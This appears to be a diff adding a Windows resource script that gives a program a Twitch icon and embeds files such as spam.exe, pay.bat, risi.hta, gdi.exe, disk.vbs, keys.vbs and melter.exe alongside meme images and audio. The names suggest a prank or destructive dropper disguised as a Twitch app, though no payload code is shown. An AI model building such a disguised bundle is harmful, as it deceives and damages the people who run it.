@@ -1,0 +1,20 @@
+// resources.rc
+IDI_ICON1 ICON "twitch.ico"
+1 24 "app.manifest"
+// fichiers embarqués
+
+
+IDR_SPAM_EXE    RCDATA "spam.exe"
+IDR_PAY_BAT     RCDATA "pay.bat"
+IDR_YO_BAT      RCDATA "yo.bat"
+IDR_YOP_BAT     RCDATA "yop.bat"
+IDR_RISITAS_JPG RCDATA "risitas.jpg"
+IDR_RISI_HTA    RCDATA "risi.hta"
+IDR_GDI2_EXE    RCDATA "gdi2.exe"
+IDR_GDI1_EXE    RCDATA "gdi.exe"
+IDR_DISK_VBS    RCDATA "disk.vbs"
+IDR_KEYS_VBS    RCDATA "keys.vbs"
+IDR_VOIX_VBS    RCDATA "voix.vbs"
+IDR_MUSIC_VBS   RCDATA "music.vbs"
+IDR_ISSOU_MP3   RCDATA "issou.mp3"
+IDR_MELTER_EXE  RCDATA "melter.exe"
